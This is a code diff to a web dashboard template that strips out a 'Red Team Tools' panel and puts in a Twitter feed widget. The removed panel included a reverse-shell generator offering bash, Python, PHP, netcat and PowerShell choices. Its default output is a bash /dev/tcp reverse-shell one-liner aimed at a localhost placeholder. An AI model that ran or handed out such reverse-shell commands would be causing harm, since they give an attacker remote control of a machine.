@@ -128,131 +128,14 @@
 </div>
 
 <div class="row mt-4">
-    <!-- Red Team Tools Container -->
+    <!-- Elfsight Twitter Feed -->
     <div class="col-md-12">
-        <div class="card shadow-sm bg-dark border-secondary">
-            <div class="card-header border-secondary p-0">
-                <ul class="nav nav-tabs border-0" id="toolTabs" role="tablist">
-                    <li class="nav-item" role="presentation">
-                        <button class="nav-link active text-light border-0 py-3 px-4 bg-transparent active-tab-border" id="shell-tab" data-bs-toggle="tab" data-bs-target="#shell-gen" type="button" role="tab">
-                            <i class="fas fa-terminal me-2 text-info"></i>Reverse Shell
-                        </button>
-                    </li>
-                    <li class="nav-item" role="presentation">
-                        <button class="nav-link text-light border-0 py-3 px-4 bg-transparent" id="encoder-tab" data-bs-toggle="tab" data-bs-target="#encoder-tool" type="button" role="tab">
-                            <i class="fas fa-code me-2 text-warning"></i>Encoder/Decoder
-                        </button>
-                    </li>
-                    <li class="nav-item" role="presentation">
-                        <button class="nav-link text-light border-0 py-3 px-4 bg-transparent" id="status-tab" data-bs-toggle="tab" data-bs-target="#status-checker" type="button" role="tab">
-                            <i class="fas fa-satellite-dish me-2 text-danger"></i>Target Status
-                        </button>
-                    </li>
-                </ul>
-            </div>
-            <div class="card-body text-light">
-                <div class="tab-content" id="toolTabsContent">
-                    <!-- Reverse Shell Generator -->
-                    <div class="tab-pane fade show active" id="shell-gen" role="tabpanel">
-                        <div class="row g-3">
-                            <div class="col-md-4">
-                                <label class="small opacity-75 mb-1">LHOST</label>
-                                <input type="text" id="lhost" class="form-control pentest-input" placeholder="127.0.0.1">
-                            </div>
-                            <div class="col-md-2">
-                                <label class="small opacity-75 mb-1">LPORT</label>
-                                <input type="text" id="lport" class="form-control pentest-input" placeholder="4444">
-                            </div>
-                            <div class="col-md-6">
-                                <label class="small opacity-75 mb-1">Type</label>
-                                <select id="shell-type" class="form-select pentest-input">
-                                    <option value="bash">Bash (-i)</option>
-                                    <option value="python">Python</option>
-                                    <option value="php">PHP</option>
-                                    <option value="nc">Netcat (Traditional)</option>
-                                    <option value="ps">PowerShell</option>
-                                </select>
-                            </div>
-                            <div class="col-12 mt-3">
-                                <div class="position-relative">
-                                    <pre id="shell-output" class="p-3 bg-black border border-secondary rounded text-info" style="min-height: 60px; cursor: pointer;">bash -i >& /dev/tcp/127.0.0.1/4444 0>&1</pre>
-                                    <button class="btn btn-sm btn-outline-info position-absolute top-0 end-0 m-2" onclick="copyToClipboard('shell-output')">
-                                        <i class="fas fa-copy"></i>
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Encoder/Decoder -->
-                    <div class="tab-pane fade" id="encoder-tool" role="tabpanel">
-                        <div class="row g-3">
-                            <div class="col-md-12">
-                                <textarea id="codec-input" class="form-control pentest-input" rows="3" placeholder="Enter text here..."></textarea>
-                            </div>
-                            <div class="col-12 d-flex gap-2">
-                                <button onclick="handleCodec('b64-enc')" class="btn btn-sm btn-outline-warning">Base64 Enc</button>
-                                <button onclick="handleCodec('b64-dec')" class="btn btn-sm btn-outline-warning">Base64 Dec</button>
-                                <button onclick="handleCodec('url-enc')" class="btn btn-sm btn-outline-warning">URL Enc</button>
-                                <button onclick="handleCodec('url-dec')" class="btn btn-sm btn-outline-warning">URL Dec</button>
-                            </div>
-                            <div class="col-md-12 mt-3">
-                                <div class="position-relative">
-                                    <textarea id="codec-output" class="form-control bg-black text-warning border-secondary" rows="3" readonly></textarea>
-                                    <button class="btn btn-sm btn-outline-warning position-absolute top-0 end-0 m-2" onclick="copyToClipboard('codec-output')">
-                                        <i class="fas fa-copy"></i>
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Target Status -->
-                    <div class="tab-pane fade" id="status-checker" role="tabpanel">
-                        <div class="row g-3">
-                            <div class="col-md-8">
-                                <input type="text" id="target-ip" class="form-control pentest-input" placeholder="Target IP or Hostname (e.g. 192.168.1.1)">
-                            </div>
-                            <div class="col-md-2">
-                                <input type="text" id="target-port" class="form-control pentest-input" placeholder="Port" value="80">
-                            </div>
-                            <div class="col-md-2">
-                                <button onclick="checkStatus()" id="check-btn" class="btn btn-danger w-100">Check</button>
-                            </div>
-                            <div class="col-12 mt-2">
-                                <div id="status-results" class="list-group list-group-flush border-top border-secondary mt-2">
-                                    <p class="text-center opacity-50 py-3">No targets checked yet.</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+        <script src="https://elfsightcdn.com/platform.js" async></script>
+        <div class="elfsight-app-94b92f32-7849-468e-af4f-7b1df51ad81b" data-elfsight-app-lazy></div>
     </div>
 </div>
 
 <style>
-    .bg-darker { background-color: #0d1117; }
-    .active-tab-border { border-bottom: 2px solid #58a6ff !important; }
-    .nav-tabs .nav-link.active { border-bottom: 2px solid #58a6ff !important; color: #58a6ff !important; }
-    
-    /* Style mới cho các ô input pentest tools */
-    .pentest-input {
-        background-color: #ced4da !important; /* Màu xám */
-        color: #000000 !important; /* Chữ đen */
-        border: 1px solid #adb5bd !important;
-    }
-    .pentest-input::placeholder {
-        color: #495057 !important;
-        opacity: 0.8;
-    }
-    .pentest-input:focus {
-        background-color: #e9ecef !important;
-        color: #000000 !important;
-        box-shadow: 0 0 0 0.25rem rgba(88, 166, 255, 0.25) !important;
-    }
-
     .hover-card {
         transition: all 0.2s;
         background-color: #0d1117;
@@ -265,4 +148,5 @@
     .hover-card div {
         color: #d1d1d1;
     }
-</style>{% endblock %}
+</style>
+{% endblock %}
